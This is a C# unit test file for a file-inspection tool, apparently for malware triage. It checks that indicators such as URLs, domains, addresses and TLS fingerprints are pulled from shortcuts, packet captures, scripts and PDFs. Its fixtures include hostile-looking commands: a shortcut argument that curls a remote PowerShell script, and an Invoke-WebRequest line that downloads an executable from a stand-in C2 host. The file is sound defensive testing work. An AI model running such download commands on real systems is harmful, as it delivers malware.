using System.Text;
using Corvus.Core;
using Corvus.Services;
using Corvus.Services.Analysis;

namespace Corvus.Tests;

/// <summary>view=indicators: the observables of every view merged into one list by type and value.</summary>
public sealed class IndicatorTests : IDisposable
{
    private readonly TempDir _dir = new();
    private readonly AssemblyWorkspace _ws = new();
    public void Dispose() { _ws.Dispose(); _dir.Dispose(); }

    private IndicatorFacts List(string name, byte[] bytes)
    {
        var path = _dir.File(name);
        File.WriteAllBytes(path, bytes);
        var summary = new InspectionService(_ws).Summarize(null, path, default, new FileViewOptions("indicators"));
        return (IndicatorFacts)summary.Views["indicators"].Detail;
    }

    private static FileView? Inspect(IFileSummaryView view, string name, byte[] bytes) => view.Inspect(new FileInput(name, bytes, Blob.Identify(bytes)), default);

    [Fact]
    public void A_shortcut_argument_URL_gives_a_url_and_its_host()
    {
        var view = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c curl http://payload.example.net/a.ps1"))!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://payload.example.net/a.ps1", Source: "lnk", Location: "arguments" });
        Assert.Contains(view.Indicators, h => h is { Type: "domain", Value: "payload.example.net" });
    }

    [Fact]
    public void A_shortcut_to_a_local_document_gives_no_indicators()
    {
        var view = Inspect(new ShellLinkFileView(), "a.lnk", ShellLinkTests.Shortcut("/c start invoice.pdf"))!;
        Assert.Empty(view.Indicators);
        Assert.DoesNotContain(view.Findings, f => f.Level == FindingLevel.Noteworthy && f.Rule.StartsWith("indicators", StringComparison.Ordinal));
    }

    [Fact]
    public void A_capture_gives_DNS_names_server_names_and_TLS_fingerprints()
    {
        var list = List("a.pcap", PcapTests.Pcap(PcapTests.EthernetFrames()));
        Assert.Contains(list.Indicators, i => i is { Type: "domain", Value: "api.example.com" });
        Assert.Contains(list.Indicators, i => i is { Type: "ja4", Value: "t12d0103h2_0f2cb44170f4_4298e3b3ed58" });
        Assert.Contains(list.Indicators, i => i.Type == "ja3" && i.Value.Length == 32);
    }

    [Theory]
    [InlineData("api.example.com", "domain")]
    [InlineData("192.0.2.7", "ipv4")]
    [InlineData("2001:db8::1", "ipv6")]
    public void A_server_name_written_as_an_address_is_typed_as_that_address(string host, string type) =>
        Assert.Equal(type, IndicatorList.HostType(host));

    [Fact]
    public void A_host_seen_as_a_DNS_name_and_a_server_name_is_one_row_with_both_places()
    {
        var list = List("a.pcap", PcapTests.Pcap(PcapTests.EthernetFrames()));
        var row = Assert.Single(list.Indicators, i => i is { Type: "domain", Value: "api.example.com" });
        Assert.Equal(["pcap"], row.Sources);
        Assert.Equal("pcap: DNS query", row.FirstLocation);
        Assert.Equal(list.Indicators.Count, list.Total);
    }

    [Fact]
    public void A_script_gives_the_URL_in_its_text()
    {
        var view = Inspect(new ScriptFileView(), "run.ps1", Encoding.UTF8.GetBytes("Invoke-WebRequest -Uri 'http://c2.example.org/x' -OutFile x.exe\n"))!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://c2.example.org/x", Source: "script" });
    }

    [Fact]
    public void A_PDF_URI_action_gives_its_URL()
    {
        var pdf = Encoding.ASCII.GetBytes("%PDF-1.4\n1 0 obj\n<</Type/Catalog/OpenAction 2 0 R>>\nendobj\n2 0 obj\n<</S/URI/URI(http://links.example.com/a)>>\nendobj\n" +
                                          "trailer\n<</Root 1 0 R>>\n%%EOF\n");
        var view = Inspect(new PdfFileView(), "a.pdf", pdf)!;
        Assert.Contains(view.Indicators, h => h is { Type: "url", Value: "http://links.example.com/a", Source: "pdf" });
    }

    [Fact]
    public void A_file_no_view_reads_gives_an_empty_list()
    {
        var list = List("a.bin", [1, 2, 3, 4]);
        Assert.Equal(0, list.Total);
    }
}
